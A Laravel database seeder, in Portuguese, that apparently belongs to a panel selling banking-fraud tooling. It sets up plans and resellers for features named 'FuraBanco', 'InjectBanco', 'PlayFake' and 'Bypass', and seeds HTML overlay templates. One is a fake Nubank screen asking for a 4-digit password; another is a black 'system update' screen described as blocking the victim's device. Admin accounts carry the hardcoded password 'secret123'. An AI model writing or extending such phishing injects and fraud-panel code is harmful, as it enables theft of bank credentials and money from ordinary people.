<?php
namespace Database\Seeders;

use App\Models\User;
use App\Models\Plan;
use App\Models\Template;
use Illuminate\Database\Seeder;

class DatabaseSeeder extends Seeder
{
    public function run(): void
    {
        $planCortesia = Plan::updateOrCreate(['slug' => 'cortesia-7d'], [
            'name' => 'Cortesia 7 Dias',
            'price' => 0.00,
            'limits' => ['apps' => 15, 'bypass' => 15],
            'features' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'active' => true,
        ]);

        $planMensal = Plan::updateOrCreate(['slug' => 'mensal'], [
            'name' => 'Plano Mensal PRO',
            'price' => 149.90,
            'limits' => ['apps' => 100, 'bypass' => 100],
            'features' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'active' => true,
        ]);

        User::updateOrCreate(['email' => 'admin@thevault.com'], [
            'name'                   => 'Admin Vault',
            'password'               => 'secret123',
            'role'                   => 'admin',
            'plan_id'                => $planMensal->id,
            'conta_status'           => 'active',
            'pode_servicos_externos' => true,
        ]);

        User::updateOrCreate(['email' => 'rev@thevault.com'], [
            'name'                => 'Revendedor Demo',
            'password'            => 'secret123',
            'role'                => 'revendedor',
            'plan_id'             => $planMensal->id,
            'conta_status'        => 'active',
            'reseller_disponivel' => true,
        ]);

        User::updateOrCreate(['email' => 'user@thevault.com'], [
            'name'            => 'luiz77',
            'password'        => 'secret123',
            'role'            => 'user',
            'plan_id'         => $planCortesia->id,
            'funcionalidades' => ['PlayFake', 'Bypass', 'FuraBanco', 'PuxadaVip', 'ScreenTroll', 'InjectBanco'],
            'conta_status'    => 'expiring_soon',
            'conta_expira_em' => now()->addDays(3),
        ]);

        Template::updateOrCreate(['title' => 'Tela Preta Overlay v1'], [
            'galeria'     => 'screen',
            'description' => 'Tela preta para bloqueio de tela e capturas.',
            'html'        => '<!DOCTYPE html><html><head><title>Overlay</title><style>body{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}</style></head><body><h1>Aguarde a atualização do sistema...</h1></body></html>',
        ]);

        Template::updateOrCreate(['title' => 'Inject Nubank v2'], [
            'galeria'     => 'inject',
            'description' => 'Interface de injeção e captura para Nubank.',
            'html'        => '<!DOCTYPE html><html><head><title>Nubank</title><style>body{background:#820ad1;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}</style></head><body><h2>Informe sua senha de 4 dígitos</h2></body></html>',
        ]);
    }
}